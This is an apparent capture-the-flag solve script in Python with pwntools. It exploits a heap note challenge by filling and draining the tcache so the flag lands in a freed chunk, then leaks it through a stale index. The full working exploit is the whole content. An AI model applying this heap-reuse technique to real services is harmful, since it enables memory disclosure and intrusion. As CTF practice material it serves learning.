#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from os import path
import sys

# ==========================[ Information
DIR = path.dirname(path.abspath(__file__))
EXECUTABLE = "/chall"
TARGET = DIR + EXECUTABLE 
HOST, PORT = "ctf.tcp1p.com", 4267
REMOTE, LOCAL = False, False

# ==========================[ Tools
elf = ELF(TARGET)
elfROP = ROP(elf)

# ==========================[ Configuration
context.update(
    arch=["i386", "amd64", "aarch64"][1],
    endian="little",
    os="linux",
    log_level = ['debug', 'info', 'warn'][2],
    terminal = ['tmux', 'split-window', '-h'],
)

# ==========================[ Exploit
def add(idx, sz, data):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b": ", str(idx).encode())
    io.sendlineafter(b": ", str(sz).encode())
    io.sendlineafter(b": ", data)
    print("CREATED")

def delete(idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b": ", str(idx).encode())
    print("DELETED")

def view(idx):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b": ", str(idx).encode())
    io.recvuntil(b": ")
    resp = io.recvuntil(b"\nMenu", drop=True)
    return resp

def exploit(io, libc=null):
    if LOCAL==True:
        #raw_input("Fire GDB!")
        if len(sys.argv) > 1 and sys.argv[1] == "d":
            choosen_gdb = [
                "source /home/mydata/tools/gdb/gdb-pwndbg/gdbinit.py",     # 0 - pwndbg
                "source /home/mydata/tools/gdb/gdb-peda/peda.py",          # 1 - peda
                "source /home/mydata/tools/gdb/gdb-gef/.gdbinit-gef.py"    # 2 - gef
                ][0]
            cmd = choosen_gdb + """
            b *read_flag+0x94
            b *read_flag+0x5a
            """
            gdb.attach(io, gdbscript=cmd)

    for i in range(5):
        add(1+i, 0x70, b"DUMMY")

    # Heap Memory Overview after 5 malloc:
    # ... 
    # Other Chunk 
    # ...
    # CHUNK_1
    # CHUNK_2
    # CHUNK_3
    # CHUNK_4
    # CHUNK_5
    # TOP CHUNK

    for i in range(5):
        delete(1+i) 
    # Tcachebins after 5 free:
    # Tcachebins [0x80]: CHUNK_5 -> CHUNK_4 -> CHUNK_3 -> CHUNK_2 -> CHUNK_1

    # Call malloc 4th times (looping: for(int i=0; i<=3; i++))
    # Tcachebins [0x80]: CHUNK_1
    # Call malloc 1 more times (to store the flag)
    # Tcachebins [0x80]: -
    # Flag has the same address as CHUNK_1
    io.sendlineafter(b"> ", b"4")


    # Leak the flag by view the content of CHUNK_1 (idx: 1)
    print(view(1).decode())

    io.interactive()

if __name__ == "__main__":
    io, libc = null, null

    if args.REMOTE:
        REMOTE = True
        io = remote(HOST, PORT)
        # libc = ELF("___")
        
    else:
        LOCAL = True
        io = process(
            [TARGET, ],
            env={
            #     "LD_PRELOAD":DIR+"/___",
            #     "LD_LIBRARY_PATH":DIR+"/___",
            },
        )
        # libc = ELF("___")
    exploit(io, libc)
